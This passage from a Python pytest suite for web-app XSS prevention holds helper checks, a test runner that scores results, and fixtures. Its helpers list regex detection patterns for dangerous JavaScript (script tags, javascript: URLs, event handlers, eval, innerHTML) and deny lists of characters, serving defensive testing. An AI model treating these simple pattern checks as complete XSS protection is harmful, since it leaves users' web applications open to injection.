            assert large_content_time < 0.5, f"Large content sanitization too slow: {large_content_time}s"
            assert "<script" not in sanitized_large.lower()
            
            self.metrics_collector.record_performance(
                "xss_protection_performance",
                {
                    "concurrent_requests": concurrent_requests,
                    "success_rate": success_rate,
                    "avg_validation_time": avg_response_time,
                    "large_content_time": large_content_time,
                    "total_time": time.time() - start_time
                }
            )
            
        except Exception as e:
            self.metrics_collector.record_error("xss_protection_performance_failed", str(e))
            raise AssertionError(f"XSS protection performance test failed: {e}")

    # ==================== HELPER METHODS ====================
    
    async def _contains_executable_js(self, content: str) -> bool:
        """Check if content contains executable JavaScript"""
        dangerous_patterns = [
            r"<script[^>]*>",
            r"javascript:",
            r"on\w+\s*=",
            r"eval\s*\(",
            r"setTimeout\s*\(",
            r"setInterval\s*\(",
            r"document\.write",
            r"document\.writeln",
            r"innerHTML\s*=",
            r"outerHTML\s*="
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    async def _is_safe_rich_text(self, content: str) -> bool:
        """Check if rich text content is safe"""
        # Rich text should not contain raw HTML
        return "<script" not in content.lower() and "javascript:" not in content.lower()
    
    async def _is_safe_markdown(self, content: str) -> bool:
        """Check if markdown content is safe"""
        # Markdown should not contain JavaScript URLs
        return "javascript:" not in content.lower()
    
    async def _is_safe_media_metadata(self, content: str) -> bool:
        """Check if media metadata is safe"""
        # Media metadata should be strictly text-only
        dangerous_chars = ["<", ">", "\"", "'", "javascript:", "data:"]
        return not any(char in content for char in dangerous_chars)

    # ==================== COMPREHENSIVE TEST SUITE ====================
    
    async def run_comprehensive_xss_tests(self) -> Dict[str, Any]:
        """Run complete XSS prevention test suite"""
        print("🛡️ Starting Comprehensive XSS Prevention Testing...")
        
        context = await self.setup_test_environment()
        test_results = {
            "total_tests": 0,
            "passed_tests": 0,
            "failed_tests": 0,
            "test_details": [],
            "performance_metrics": {},
            "security_score": 0
        }
        
        test_methods = [
            # Reflected XSS Tests
            self.test_reflected_xss_prevention,
            self.test_reflected_xss_encoding,
            
            # Stored XSS Tests
            self.test_stored_xss_prevention,
            self.test_creator_content_xss_prevention,
            
            # DOM XSS Tests
            self.test_dom_based_xss_prevention,
            
            # CSP Tests
            self.test_content_security_policy,
            
            # Sanitization Tests
            self.test_input_sanitization,
            
            # Advanced Attack Tests
            self.test_advanced_xss_attacks,
            
            # Performance Tests
            self.test_xss_protection_performance,
        ]
        
        for test_method in test_methods:
            test_results["total_tests"] += 1
            test_name = test_method.__name__
            
            try:
                print(f"  Running {test_name}...")
                await test_method(context)
                test_results["passed_tests"] += 1
                test_results["test_details"].append({
                    "name": test_name,
                    "status": "PASSED",
                    "error": None
                })
                print(f"  ✅ {test_name} PASSED")
                
            except Exception as e:
                test_results["failed_tests"] += 1
                test_results["test_details"].append({
                    "name": test_name,
                    "status": "FAILED",
                    "error": str(e)
                })
                print(f"  ❌ {test_name} FAILED: {e}")
        
        # Calculate security score
        security_score = (test_results["passed_tests"] / test_results["total_tests"]) * 100
        test_results["security_score"] = security_score
        
        # Collect performance metrics
        test_results["performance_metrics"] = self.metrics_collector.get_metrics()
        
        await self.teardown_test_environment(context)
        
        print(f"\n🛡️ XSS Prevention Testing Complete!")
        print(f"   Tests Passed: {test_results['passed_tests']}/{test_results['total_tests']}")
        print(f"   Security Score: {security_score:.1f}%")
        
        return test_results


# ==================== PYTEST INTEGRATION ====================

@pytest.fixture
async def xss_test_template():
    """Pytest fixture for XSS testing"""
    template = XSSPreventionTestTemplate()
    yield template
    # Cleanup handled by template

@pytest.fixture
async def xss_context(xss_test_template):
    """Pytest fixture for XSS context"""
    context = await xss_test_template.setup_test_environment()
    yield context
    await xss_test_template.teardown_test_environment(context)

# Individual test functions for pytest discovery
@pytest.mark.asyncio
async def test_reflected_xss(xss_test_template, xss_context):
    """Test reflected XSS prevention"""
    await xss_test_template.test_reflected_xss_prevention(xss_context)
    await xss_test_template.test_reflected_xss_encoding(xss_context)

@pytest.mark.asyncio
async def test_stored_xss(xss_test_template, xss_context):
    """Test stored XSS prevention"""
    await xss_test_template.test_stored_xss_prevention(xss_context)
    await xss_test_template.test_creator_content_xss_prevention(xss_context)

@pytest.mark.asyncio
async def test_dom_xss(xss_test_template, xss_context):
    """Test DOM-based XSS prevention"""
    await xss_test_template.test_dom_based_xss_prevention(xss_context)

@pytest.mark.asyncio
async def test_csp_protection(xss_test_template, xss_context):
    """Test Content Security Policy"""
    await xss_test_template.test_content_security_policy(xss_context)

@pytest.mark.asyncio
async def test_input_validation(xss_test_template, xss_context):
    """Test input sanitization"""
    await xss_test_template.test_input_sanitization(xss_context)

@pytest.mark.asyncio
async def test_advanced_attacks(xss_test_template, xss_context):
    """Test advanced XSS attacks"""
    await xss_test_template.test_advanced_xss_attacks(xss_context)

@pytest.mark.asyncio
@pytest.mark.performance
async def test_xss_performance(xss_test_template, xss_context):
    """Test XSS protection performance"""
    await xss_test_template.test_xss_protection_performance(xss_context)

@pytest.mark.asyncio
@pytest.mark.integration
async def test_comprehensive_xss_suite(xss_test_template):
    """Run comprehensive XSS prevention test suite"""
    results = await xss_test_template.run_comprehensive_xss_tests()
    assert results["security_score"] >= 90, f"Security score {results['security_score']}% below minimum 90%"


if __name__ == "__main__":
    """
    Run XSS prevention tests directly
    Usage: python xss_prevention_test_template.py
    """
    async def main():
        template = XSSPreventionTestTemplate()
        results = await template.run_comprehensive_xss_tests()
        
        print("\n" + "="*80)
        print("🛡️ XSS PREVENTION TEST RESULTS")
        print("="*80)
        print(f"Security Score: {results['security_score']:.1f}%")
        print(f"Tests Passed: {results['passed_tests']}/{results['total_tests']}")
        
        if results['failed_tests'] > 0:
            print("\n❌ Failed Tests:")
            for test in results['test_details']:
                if test['status'] == 'FAILED':
                    print(f"  - {test['name']}: {test['error']}")
        
        return results['security_score'] >= 90
    
    # Run the tests
    import asyncio
    success = asyncio.run(main())
    exit(0 if success else 1)